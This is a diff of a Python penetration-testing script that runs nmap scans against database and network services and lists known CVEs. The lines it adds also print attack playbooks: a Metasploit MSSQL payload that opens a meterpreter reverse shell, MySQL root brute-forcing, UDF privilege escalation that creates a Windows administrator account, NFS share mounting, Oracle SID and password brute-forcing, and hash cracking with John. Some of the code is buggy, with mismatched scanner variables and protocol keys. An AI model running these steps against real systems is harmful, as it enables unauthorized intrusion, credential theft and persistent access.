@@ -13,16 +13,16 @@ def CVE_DNS_53():
 
 	data = socket.gethostbyname(srv)
 	print("\t\tResult: ")
-	print("\t\t\tService: "+nm[data]['udp'][53]['name'])
-	print("\t\t\tState: "+nm[data]['udp'][53]['state'])
-	print("\t\t\tReason: "+nm[data]['udp'][53]['reason'])
-	print("\t\t\tProduct: "+nm[data]['udp'][53]['product'])
-	print("\t\t\tVersion: "+nm[data]['udp'][53]['version'])
-	print("\t\t\tMore Info: "+nm[data]['udp'][53]['extrainfo'])
+	print("\t\t\tService: "+nms[data]['udp'][53]['name'])
+	print("\t\t\tState: "+nms[data]['udp'][53]['state'])
+	print("\t\t\tReason: "+nms[data]['udp'][53]['reason'])
+	print("\t\t\tProduct: "+nms[data]['udp'][53]['product'])
+	print("\t\t\tVersion: "+nms[data]['udp'][53]['version'])
+	print("\t\t\tMore Info: "+nms[data]['udp'][53]['extrainfo'])
 
 	try:
 		print("\t\t\t\tdns-nsid:")
-		print("\t\t\t\t\t"+nm[ip]['udp'][53]['script']['dns-nsid'])
+		print("\t\t\t\t\t"+nms[ip]['udp'][53]['script']['dns-nsid'])
 	except:
 		print("")
 
@@ -30,16 +30,16 @@ def CVE_DNS_53():
 	print("\nTesting configuration of DNS recursion ...")
 	argsv = "-Pn -sSUV -p53 --script dns-recursion,dns-random-srcport,dns-random-txid"
 	nms.scan(srv, arguments=argsv)
-	print("\t\t\tService: "+nm[data]['udp'][53]['name'])
-	print("\t\t\tState: "+nm[data]['udp'][53]['state'])
-	print("\t\t\tReason: "+nm[data]['udp'][53]['reason'])
-	print("\t\t\tProduct: "+nm[data]['udp'][53]['product'])
-	print("\t\t\tVersion: "+nm[data]['udp'][53]['version'])
-	print("\t\t\tMore Info: "+nm[data]['udp'][53]['extrainfo'])
+	print("\t\t\tService: "+nms[data]['udp'][53]['name'])
+	print("\t\t\tState: "+nms[data]['udp'][53]['state'])
+	print("\t\t\tReason: "+nms[data]['udp'][53]['reason'])
+	print("\t\t\tProduct: "+nms[data]['udp'][53]['product'])
+	print("\t\t\tVersion: "+nms[data]['udp'][53]['version'])
+	print("\t\t\tMore Info: "+nms[data]['udp'][53]['extrainfo'])
 
 	print("""
 	Vulnerabilities for ISC BIND 9
-				CVE-2016-1285
+				CVE-2016-2776
 				CVE-2016-1284
 				CVE-2015-8461
 				CVE-2015-5986
@@ -804,7 +804,7 @@ def CVE_143_993_IMAP(ip,port):
 		print("\t\t\tMore Info: "+nm[ip]['tcp'][143]['extrainfo'])
 
 		try:
-			print("\t\t\tIMAP Capabilities: "+nm[ip]['tcp'][143]['script']['imap-capabilities']
+			print("\t\t\tIMAP Capabilities: "+nm[ip]['tcp'][143]['script']['imap-capabilities'])
 		except:
 			print("There\'s no more information")
 	elif 993 in port:
@@ -971,26 +971,75 @@ def CVE_88_464_749_Kerberos(ip):
 			CVE-2009-0846
 	""")
 
-def CVE_389_636_3268_3269_LDAP(ip):
+def CVE_389_636_3268_3269_LDAP(ip, port):
 	print("LDAP: \n\t\t389 tcp/udp\n\t\t636 over TLS\n\t\t3268 tcp globalcat\n\t\t3269 tcp globalcats")
 
 	#rozpoznanie
 	print("Recognition of LDAP ...")
 	nm = nmap.PortScanner()
-	nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 389')
 
-	print("\t\tService: "+nm[ip]['tcp'][389]['name'])
-	print("\t\t\tState: "+nm[ip]['tcp'][389]['state'])
-	print("\t\t\tReason: "+nm[ip]['tcp'][389]['reason'])
-	print("\t\t\tProduct: "+nm[ip]['tcp'][389]['product'])
-	print("\t\t\tVersion: "+nm[ip]['tcp'][389]['version'])
-	print("\t\t\tMore Info: "+nm[ip]['tcp'][389]['extrainfo'])
+	if port == 389:
+		nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 389')
 
-	try:
-		print("\t\tLDAP rootdse: "+nm[ip]['tcp'][389]['script']['ldap-rootdse'])
-		print("\t\tLDAP search: "+nm[ip]['tcp'][389]['script']['ldap-search'])
-	except:
-		print("")
+		print("\t\tService: "+nm[ip]['tcp'][389]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][389]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][389]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][389]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][389]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][389]['extrainfo'])
+
+		try:
+			print("\t\tLDAP rootdse: "+nm[ip]['tcp'][389]['script']['ldap-rootdse'])
+			print("\t\tLDAP search: "+nm[ip]['tcp'][389]['script']['ldap-search'])
+		except:
+			print("")
+	elif port == 636:
+		nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 636')
+
+		print("\t\tService: "+nm[ip]['tcp'][636]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][636]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][636]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][636]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][636]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][636]['extrainfo'])
+
+		try:
+			print("\t\tLDAP rootdse: "+nm[ip]['tcp'][636]['script']['ldap-rootdse'])
+			print("\t\tLDAP search: "+nm[ip]['tcp'][636]['script']['ldap-search'])
+		except:
+			print("")
+
+	elif port == 3268:
+		nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 3268')
+
+		print("\t\tService: "+nm[ip]['tcp'][3268]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][3268]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][3268]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][3268]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][3268]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][3268]['extrainfo'])
+
+		try:
+			print("\t\tLDAP rootdse: "+nm[ip]['tcp'][3268]['script']['ldap-rootdse'])
+			print("\t\tLDAP search: "+nm[ip]['tcp'][3268]['script']['ldap-search'])
+		except:
+			print("")
+
+	elif port == 3269:
+		nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 3269')
+
+		print("\t\tService: "+nm[ip]['tcp'][3269]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][3269]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][3269]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][3269]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][3269]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][3269]['extrainfo'])
+
+		try:
+			print("\t\tLDAP rootdse: "+nm[ip]['tcp'][3269]['script']['ldap-rootdse'])
+			print("\t\tLDAP search: "+nm[ip]['tcp'][3269]['script']['ldap-search'])
+		except:
+			print("")
 
 
 	#siłowe łamanie haseł na systemie windows:
@@ -999,7 +1048,7 @@ def CVE_389_636_3268_3269_LDAP(ip):
 
 	#łamanie hasła usera ujawnionego przez LDAP
 	print("Breaking the user\'s password disclosed by LDAP: ")
-	print("ldapsearch -D \"cn=admin\" -w secret123 -p 389 -h <ip> -s base -b \"ou=people,dc=orcharddrivellc,dc=com\" \"objectclass=*\")
+	print("ldapsearch -D \"cn=admin\" -w secret123 -p 389 -h <ip> -s base -b \"ou=people,dc=orcharddrivellc,dc=com\" \"objectclass=*\"")
 	print("echo \"uid:userpassword\" > hash.txt")
 	print("example: echo \"jsmith:{SSHA}...\" > hash.txt")
 	print("john hash.txt -wordlist=common.txt")
@@ -1013,4 +1062,365 @@ def CVE_389_636_3268_3269_LDAP(ip):
 		CVE-2011-1561
 		CVE-2011-0917
 		CVE-2010-0358
+	""")
+
+def CVE_11211_memcached(ip):
+	nm = nmap.PortScanner()
+	print("Memcached-Info script running ...")
+	nm.scan(ip, arguments='-p11211 --script memcached-info')
+
+	print("\t\tService: "+nm[ip]['udp'][11211]['name'])
+	print("\t\t\tState: "+nm[ip]['udp'][11211]['state'])
+	print("\t\t\tReason: "+nm[ip]['udp'][11211]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['udp'][11211]['product'])
+	print("\t\t\tVersion: "+nm[ip]['udp'][11211]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['udp'][11211]['extrainfo'])
+
+	try:
+		print("\t\tMemcached Info: "+nm[ip]['udp'][11211]['script']['memcached-info'])
+	except:
+		print("")
+
+	#wydobywanie par klucz-wartość z memcached
+	#user auxiliary/gather/memcached_extractor
+	#set rhosts <ip>
+	#run
+
+def CVE_1433_1434_microsoft_sql_server(ip, port):
+	nm = nmap.PortScanner()
+	print("Checking Microsoft SQL Server ...")
+	nm.scan(ip, arguments='-sSUVC -p1433,1434 -n')
+
+	if port == 1433:
+		print("\t\tService: "+nm[ip]['tcp'][1433]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][1433]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][1433]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][1433]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][1433]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][1433]['extrainfo'])
+
+	if port == 1434:
+		print("\t\tService: "+nm[ip]['tcp'][1434]['name'])
+		print("\t\t\tState: "+nm[ip]['tcp'][1434]['state'])
+		print("\t\t\tReason: "+nm[ip]['tcp'][1434]['reason'])
+		print("\t\t\tProduct: "+nm[ip]['tcp'][1434]['product'])
+		print("\t\t\tVersion: "+nm[ip]['tcp'][1434]['version'])
+		print("\t\t\tMore Info: "+nm[ip]['tcp'][1434]['extrainfo'])
+
+	try:
+		print("\t\tMS-SQL-Info: "+nm[ip]['tcp'][1433]['script']['ms-sql-info'])
+	except:
+		print("")
+
+	try:
+		print("\t\tMS-SQL-Info: "+nm[ip]['tcp'][1434]['script']['ms-sql-info'])
+	except:
+		print("")
+
+	#wykonywanie lokalnego polecenia powłoki systemu za pośrednictwem SQL Server
+	#use exploit/windows/mssql/mssql_payload
+	#set payload windows/meterpreter/reverse_tcp
+	#set lhost <ip>
+	#set rhost <ip>
+	#set mssql_user distributor _admin
+	#set mssql_pass password
+	#run
+	#sysinfo
+
+	print("""
+		Known Vulns of Microsoft SQL Server:
+			CVE-2015-1763
+			CVE-2015-1762
+			CVE-2012-1856
+			CVE-2012-0158
+	""")
+
+def CVE_27017_MongoDB(ip):
+	nm = nmap.PortScanner()
+	print("Checking Mongo DB ...")
+	nm.scan(ip, arguments='-p27017 --script mongodb-info')
+
+	print("\t\tService: "+nm[ip]['tcp'][27017]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][27017]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][27017]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][27017]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][27017]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][27017]['extrainfo'])
+
+	try:
+		print("\t\tMongoDB Info: "+nm[ip]['tcp'][27017]['script']['mongodb-info'])
+	except:
+		print("")
+
+	print("""
+		Known Vulns of MongoDB:
+			CVE-2013-4650
+			CVE-2013-3969
+			CVE-2013-1892
+			CVE-2012-6619
+	""")
+
+def CVE_5353_MulticastDNS(ip):
+	nm = nmap.PortScanner()
+	print("Checking MulticastDNS ...")
+	nm.scan(ip, arguments='-p5353 -Pn -sUC')
+
+	print("\t\tService: "+nm[ip]['udp'][5353]['name'])
+	print("\t\t\tState: "+nm[ip]['udp'][5353]['state'])
+	print("\t\t\tReason: "+nm[ip]['udp'][5353]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['udp'][5353]['product'])
+	print("\t\t\tVersion: "+nm[ip]['udp'][5353]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['udp'][5353]['extrainfo'])
+
+	try:
+		print("\t\t\tMulticastDNS Info: "+nm[ip]['tcp'][5353]['script']['multicastdns-info'])
+	except:
+		print("")
+
+def CVE_3306_MySQL(ip):
+	nm = nmap.PortScanner()
+	print("Checking MySQL port ...")
+	nm.scan(ip, arguments='-sSVC -p3306 -n')
+
+	print("\t\tService: "+nm[ip]['tcp'][3306]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][3306]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][3306]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][3306]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][3306]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][3306]['extrainfo'])
+
+	try:
+		print("\t\t\tMySQL Info: "+nm[ip]['tcp'][3306]['script']['mysql-info'])
+	except:
+		print("")
+
+	print("Geussing weak password for root:")
+	print("run metasploit: \'msfconsole\'")
+	print("use auxiliary/scanner/mysql/mysql_login")
+	print("set username root")
+	print("set pass_file /root/common.txt")
+	print("set user_as_pass true")
+	print("set blank_passwords true")
+	print("set rhosts")
+	print("set verbose false")
+	print("run")
+
+	print("Interaction with mysql service:")
+	print("mysql -h <ip> -u root -p")
+	print("show databases;")
+
+	print("Local privilege escalation in Linux system with UDF:")
+	print("use mysql;")
+	print("create table npn(line blob);")
+	print("insert into npn values(load_file(\'/tmp/lib_mysqludf_sys.so\'));")
+	print("select * from npn into dumpfile \'/tmp/lib_mysqludf_sys.so\';")
+	print("create function sys_exec returns integer soname \'lib_mysqludf_sys.so\';")
+	print("select sys_exec(\'id > /tmp/out.txt\');")
+
+	print("Local privilege escalation in windows system with UDF:")
+	print("user mysql;")
+	print("create table npn(line blob);")
+	print("insert into npn values(load_files(\'C://temp//lib_mysqludf_sys.dll\'));")
+	print("select * from mysql.npn into dumpfile \'c://windows//system32//lib_mysqludf_sys_32.dll\';")
+	print("create function sys_exec returns integer soname \'lib_mysqludf_sys_32.dll\';")
+	print("select sys_exec(\"net user npn npn12345678 /add\");")
+	print("select sys_exec(\"net localgroup Administrators npn /add\");")
+
+	print("""
+		Known Vulns of MySQL:
+			CVE-2015-0411
+			CVE-2014-6500
+			CVE-2014-6491
+			CVE-2014-6507
+			CVE-2013-1492
+			CVE-2012-5612
+			CVE-2012-5611
+			CVE-2012-3163
+			CVE-2012-0553
+			CVE-2012-0882
+			CVE-2012-5615
+			CVE-2012-3158
+			CVE-2012-2750
+			CVE-2012-2122
+			CVE-2010-1850
+	""")
+
+def CVE_137_NetBIOS(ip):
+	nm = nmap.PortScanner()
+	print("Checking NetBIOS port ...")
+	nm.scan(ip, arguments='-Pn -sUC -p137')
+
+	print("\t\tService: "+nm[ip]['udp'][137]['name'])
+	print("\t\t\tState: "+nm[ip]['udp'][137]['state'])
+	print("\t\t\tReason: "+nm[ip]['udp'][137]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['udp'][137]['product'])
+	print("\t\t\tVersion: "+nm[ip]['udp'][137]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['udp'][137]['extrainfo'])
+
+	try:
+		print("\t\t\tNetBIOS Info: "+nm[ip]['udp'][137]['script']['netbios-info'])
+	except:
+		print("")
+
+	print("""
+		Known Vulns of NetBIOS:
+			CVE-2015-2474 Windows Server 2008 SP2
+			CVE-2011-0661 Windows Server 2008 R2 SP1
+			CVE-2010-2550 Windows Server 2008 R2
+			CVE-2010-0231 Windows Server 2008 R2
+			CVE-2010-0020 Windows Server 2008 R2
+			CVE-2009-2532 Windows Server 2008 SP2
+			CVE-2009-3103 Windows Server 2008 SP2
+	""")
+
+def CVE_111_32771_NFS(ip, port):
+	nm = nmap.PortScanner()
+	print("Cheking NFS ports ...")
+	nm.scan(ip, arguments='-sSUC -p111,32771')
+
+	if port == 111:
+		try:
+			print("\t\tService: "+nm[ip]['udp'][111]['name'])
+			print("\t\t\tState: "+nm[ip]['udp'][111]['state'])
+			print("\t\t\tReason: "+nm[ip]['udp'][111]['reason'])
+			print("\t\t\tProduct: "+nm[ip]['udp'][111]['product'])
+			print("\t\t\tVersion: "+nm[ip]['udp'][111]['version'])
+			print("\t\t\tMore Info: "+nm[ip]['udp'][111]['extrainfo'])
+
+			try:
+				print("\t\t\tNFS Info for port 111: "+nm[ip]['udp'][111]['script']['nfs-info'])
+			except:
+				print("")
+		except:
+			print("111 port for NSF is disabled")
+	elif port == 32771:
+		try:
+			print("\t\tService: "+nm[ip]['udp'][32771]['name'])
+			print("\t\t\tState: "+nm[ip]['udp'][32771]['state'])
+			print("\t\t\tReason: "+nm[ip]['udp'][32771]['reason'])
+			print("\t\t\tProduct: "+nm[ip]['udp'][32771]['product'])
+			print("\t\t\tVersion: "+nm[ip]['udp'][32771]['version'])
+			print("\t\t\tMore Info: "+nm[ip]['udp'][32771]['extrainfo'])
+
+			try:
+				print("\t\t\tNFS Info for port 32771: "+nm[ip]['udp'][32771]['script']['nfs-info'])
+			except:
+				print("")
+		except:
+			print("32771 port for NFS is disabled")
+
+	print("Enumeration of NFS and getting an access: ")
+	print("showmount -e <ip>")
+	print("mkdir /tmp/mnt")
+	print("mount <ip>:/home /tmp/mnt")
+	print("cd /tmp/mnt")
+	print("ls -la")
+
+	print("""
+		Known Vulns of NFS:
+			CVE-2013-3266
+			CVE-2012-2448
+			CVE-2010-2521
+			CVE-2011-2500
+			CVE-2009-3517
+	""")
+
+def CVE_123_NTP(ip):
+	nm = nmap.PortScanner()
+	print("Checking NTP on port 123 ...")
+	nm.scan(ip, arguments='-sU -p123 --script ntp-*')
+
+	print("\t\tService: "+nm[ip]['tcp'][123]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][123]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][123]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][123]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][123]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][123]['extrainfo'])
+
+	try:
+		print("\t\t\tNTP Info: "+nm[ip]['tcp'][123]['script']['ntp-info'])
+	except:
+		print("")
+
+	print("""
+		Known Vulns of NTP:
+			CVE-2016-1384
+			CVE-2015-7871
+			CVE-2015-7855 - CVE-2015-7848
+			CVE-2014-9750
+			CVE-2014-9295
+			CVE-2014-3309
+			CVE-2013-5211
+			CVE-2009-1252
+			CVE-2009-0159
+			CVE-2009-0021
+	""")
+
+def CVE_1521_OracleDB(ip):
+	nm = nmap.PortScanner()
+	print("Checking OracleDB on port 1521 ...")
+	nm.scan(ip, arguments='-sSV -p1521 -n')
+
+	print("\t\tService: "+nm[ip]['tcp'][1521]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][1521]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][1521]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][1521]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][1521]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][1521]['extrainfo'])
+
+	try:
+		print("\t\t\tOracleDB Info: "+nm[ip]['tcp'][1521]['script']['oracledb-info'])
+	except:
+		print("")
+
+	print("Below you'll see some terminal commands which you need to use in some cases:")
+	print("Interaction with TNS Listener Oracle Database service:\n\t\ttnscmd10g version -h <ip>\n")
+	print("Sending \'status\' command to TNS Listener service:\n\t\ttnscmd10g status -h <ip>\n\t\ttnscmd10g status -h <ip> --10G\n")
+	print("For below commands use metasploit framework:")
+	print("use auxiliary/scanner/oracle/sid_enum\nset rhosts <ip>\nrun\n")
+	print("Brute-Force SID:")
+	print("use auxiliary/scanner/oracle/sid_brute\nset rhosts <ip>\nset verbose false\nrun\n")
+	print("Brute-Force passwords in Oracle Database ...")
+
+	nm.scan(ip, arguments='-p1521 --script oracle-brute --script-args oracle-brute.sid=TEST -n')
+
+	print("\t\tService: "+nm[ip]['tcp'][1521]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][1521]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][1521]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][1521]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][1521]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][1521]['extrainfo'])
+
+	try:
+		print("\t\t\tOracleDB Info2: "+nm[ip]['tcp'][1521]['script']['oracledb-info'])
+	except:
+		print("")
+
+	print("Reading and braeking hashes of passwords of Oracle Database ...")
+
+	nm.scan(ip, arguments='-p1521 --script oracle-brute=stealth --script-args oracle-brute-stealth.sid=DB11g -n')
+
+	print("\t\tService: "+nm[ip]['tcp'][1521]['name'])
+	print("\t\t\tState: "+nm[ip]['tcp'][1521]['state'])
+	print("\t\t\tReason: "+nm[ip]['tcp'][1521]['reason'])
+	print("\t\t\tProduct: "+nm[ip]['tcp'][1521]['product'])
+	print("\t\t\tVersion: "+nm[ip]['tcp'][1521]['version'])
+	print("\t\t\tMore Info: "+nm[ip]['tcp'][1521]['extrainfo'])
+
+
+	try:
+		print("\t\t\tOracleDB Info3: "+nm[ip]['tcp'][1521]['script']['oracledb-info'])
+	except:
+		print("")
+	print("next commands for this scan:cat > hashes.txt << STOP\njohn hashes.txt\n")
+
+	print("""
+		Known Vuln of OracleDB:
+			CVE-2012-1675
+			CVE-2010-3600
+			CVE-2010-2415
+			CVE-2010-0870
+			CVE-2010-0866
+			CVE-2009-1979
+			CVE-2009-0978
 	""")
